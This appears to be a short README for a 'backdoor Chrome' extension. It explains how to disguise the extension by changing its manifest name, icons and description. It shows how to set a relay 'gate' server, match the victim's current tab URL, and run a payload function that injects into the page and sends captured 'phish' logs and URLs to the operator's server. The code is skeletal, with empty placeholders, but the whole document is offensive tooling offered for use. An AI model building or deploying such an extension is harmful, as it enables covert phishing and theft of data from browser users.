![backdoor Chrome](http://s9.postimg.org/vvo5ncxy7/chrome.png)

## Change name, icones, description

change it on manifest

![Backdoor chrome](http://s15.postimg.org/yf0rmsfuj/rename.png)

## Change Gate
```JavaScript
    var server_web = "http://localhost:8888/"
    var lock_page = "relais/lock.php"
    var gate_page = "relais/index.php"
```

## lock.php

Update lock page in 1

![Backdoor lock](http://s27.postimg.org/vahc0lb8z/lock.png)

## Check URL
```JavaScript
    // VERIFIED D'URL
    if(tabURL.indexOf('') !== -1 ) // url in ''
    {
        Payload_exemple();
    }
```

## Create payload
```JavaScript
    // PAYLOAD FUNCTION NEED HTTPS
    function Payload_exemple()
    {
        console.log('Injected here')
        var urls = "" // Var for URL
        var phish = "" // Var for logs 
        $.get(server_web+gate_page, { info: phish, url: urls } );
    }
```

## Go to web relais
enjoy